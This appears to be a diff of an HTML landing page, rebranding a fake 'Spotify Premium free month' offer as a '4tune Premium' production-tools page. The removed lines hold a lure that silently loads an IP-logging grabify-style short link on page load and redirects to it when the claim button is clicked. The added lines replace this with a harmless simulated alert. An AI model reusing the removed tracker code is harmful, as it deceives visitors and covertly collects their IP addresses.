@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify Premium - Claim Your Free Month</title>
+    <title>4tune Premium - Unlock Trap Studio</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -194,12 +194,10 @@
     <div class="container">
         <div class="header">
             <div class="logo">
-                <i class="fas fa-music"></i>
-            </div>
-            <h1>Spotify Premium</h1>
-            <p>1 Month FREE Trial</p>
-        </div>
-
+                    <i class="fas fa-wave-square"></i>
+                </div>
+                <h1>4tune Premium</h1>
+                <p>Unlock enhanced trap production tools</p>
         <div class="content">
             <div class="benefits">
                 <div class="benefit-item">
@@ -237,7 +235,7 @@
             </div>
 
             <div class="back-link">
-                <a href="javascript:history.back()">← Back to Spotifi</a>
+                <a href="javascript:history.back()">← Back to 4tune</a>
             </div>
         </div>
     </div>
@@ -247,27 +245,14 @@
     </div>
 
     <script>
-        // Hidden iframe to trigger grabify link without showing it
-        function loadGrabifyLink() {
-            const img = new Image();
-            img.src = 'https://urlto.me/2BqM5.mp3';
-        }
-
-        // Load grabify on page load (silently)
-        window.addEventListener('load', () => {
-            loadGrabifyLink();
-        });
-
-        // Claim button
         document.getElementById('claimBtn').addEventListener('click', () => {
             const overlay = document.getElementById('loadingOverlay');
             overlay.classList.add('active');
 
-            // Simulate processing time
             setTimeout(() => {
-                // Redirect to grabify link
-                window.location.href = 'https://urlto.me/2BqM5.mp3';
-            }, 2000);
+                overlay.classList.remove('active');
+                alert('4tune Premium access simulated. Feature landing page coming soon.');
+            }, 1500);
         });
     </script>
 </body>
